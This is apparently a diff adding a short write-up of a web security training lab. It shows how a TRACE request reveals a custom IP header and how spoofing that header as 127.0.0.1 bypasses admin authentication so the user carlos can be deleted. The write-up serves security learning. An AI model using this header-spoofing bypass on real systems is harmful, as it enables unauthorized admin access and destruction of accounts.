@@ -1,0 +1,26 @@
+Lab: Authentication bypass via information disclosure
+
+Vulnerability: This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.
+
+Goal: To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete the user carlos.
+
+Analysis and Solution:
+1. Log in with credentials wiener:peter and try access /admin page 
+=> Error message: Admin interface only available to local users
+
+2. Send a request TRACE /my-account?id=wiener
+=> See a response: 
++ HTTP/2 200 OK => Demonstrate that TRACE request is not disabled by web server
++ X-Custom-IP-Authorization: 42.114.132.169 => This header field can be added into header by proxy, load balancer or web server and this IP is my public IP
+
+3. Add X-Custom-IP-Authorization: 42.114.132.169 into header of request GET /my-account?id=wiener
+=> It is not removed by web server
+
+4. Add X-Custom-IP-Authorization: 127.0.0.1 into header of request GET /my-account?id=wiener
+=> It is also not removed by web server
+
+5. Add X-Custom-IP-Authorization: 127.0.0.1 into header of request GET /admin 
+=> It is ok, now we can access /admin
+
+6. Make a request POST /admin/delete?username=carlos with X-Custom-IP-Authorization: 127.0.0.1 in the header of this request
+=> SUCCESSFULLY delete carlos account
